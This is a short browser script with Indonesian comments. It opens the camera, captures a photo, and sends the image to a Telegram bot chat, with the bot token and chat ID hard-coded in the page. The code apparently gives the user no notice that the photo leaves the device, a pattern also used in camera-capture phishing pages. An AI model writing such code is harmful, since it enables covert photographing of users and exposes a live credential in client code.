<script>
  const video = document.getElementById('camera-view');
  const canvas = document.getElementById('camera-canvas');
  const photoResult = document.getElementById('photo-result');

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
    })
    .catch(error => {
      console.error('Gagal akses kamera:', error);
      alert('Tidak dapat mengakses kamera.');
    });

  function takePhoto() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/png');
    photoResult.src = imageData;
    photoResult.style.display = 'block';

    // Kirim ke Telegram
    const token = '7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
    const chatId = '7041008009';

    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: JSON.stringify({
        chat_id: chatId,
        photo: imageData,
        caption: "Foto dari Web App"
      }),
      headers: {
        'Content-Type': 'application/json'
      }
    })
    .then(response => response.json())
    .then(data => {
      console.log('Berhasil kirim:', data);
    })
    .catch(error => {
      console.error('Gagal kirim ke Telegram:', error);
    });
  }
</script>
